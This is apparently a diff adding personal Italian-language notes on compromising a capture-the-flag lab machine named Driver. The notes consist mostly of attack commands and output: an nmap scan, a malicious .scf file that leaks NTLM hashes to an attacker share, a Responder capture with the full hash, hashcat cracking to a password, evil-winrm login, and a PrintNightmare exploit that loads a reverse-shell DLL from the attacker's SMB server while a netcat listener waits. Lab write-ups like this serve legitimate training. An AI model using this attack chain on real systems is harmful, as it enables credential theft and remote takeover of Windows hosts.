@@ -1,0 +1,61 @@
+# Nmap 7.91 scan initiated Thu Oct 21 00:00:23 2021 as: nmap -sV -T4 -p- -oN sV_Full 10.10.11.106
+Nmap scan report for 10.10.11.106
+Host is up (0.18s latency).
+Not shown: 65531 filtered ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+135/tcp  open  msrpc        Microsoft Windows RPC
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+
+- port 80 website con credenziali banali admin:admin  
+- c'è un upload
+
+-creato file chiamato @shell.scf con all'interno:
+
+[Shell]
+Command=2
+IconFile=\\10.10.16.70\share\test.ico
+[Taskbar]
+Command=ToggleDesktop 
+
+-messo in ascolto responder:
+
+sudo responder -wrf -I tun0 
+
+-caricato il file e ottenuto risposta su responder con hash di tony:
+[+] Listening for events...                                                                                                                                                                                                                  
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.106
+[SMB] NTLMv2-SSP Username : DRIVER\tony
+[SMB] NTLMv2-SSP Hash     : tony::DRIVER:396ab3e34f71b6c5:6CFEDCD1B728E6C0795A8F9E6C5BACD6:010100000000000080242AE114C6D701F12D74B505DE60620000000002000800510037004500430001001E00570049004E002D0045004900580057004B0059003600350033003000390004003400570049004E002D0045004900580057004B005900360035003300300039002E0051003700450043002E004C004F00430041004C000300140051003700450043002E004C004F00430041004C000500140051003700450043002E004C004F00430041004C000700080080242AE114C6D70106000400020000000800300030000000000000000000000000200000DE8C38C4DEF709217225203B7923B5740143222DE46CA6EC5A6992446CD2D9950A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0037003000000000000000000000000000
+
+-hash craccato con hashcat: .\hashcat.exe -a 0 -m 5600 hash .\rockyou.txt
+	tony:liltony
+
+- nmap dice che  5985 è aperta ( winrm, windows remote managment, che fornisce una shell autenticata), mi collego con evil winrm:
+
+evil-winrm -u Tony -p liltony -i driver.htb
+
+*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
+0ec60eccc57ff4feebe9d717a5b20d83
+
+
+- non possiamo eseguire exploit sulla macchina (print nightmare provato ma fallito)
+- vulnerabile a printnighmare ma versine impacket, https://github.com/cube0x0/CVE-2021-1675
+	settare environment: https://github.com/cube0x0/CVE-2021-1675/issues/19
+	NB, smbserver deve essere su 
+	impacket-smbserver smb /tmp/   
+	nel mentre devo essere in ascolto su nc 
+	nc -lnvp 9999
+	e per ultimo lanciare l expoit:
+	python3 CVE-2021-1675.py driver.htb/tony:liltony@10.10.11.106 '\\10.10.16.46\smb\rev.dll' 
+	
+-root flag:
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+f9197851779cd9fc64dd4f80d4b7d880
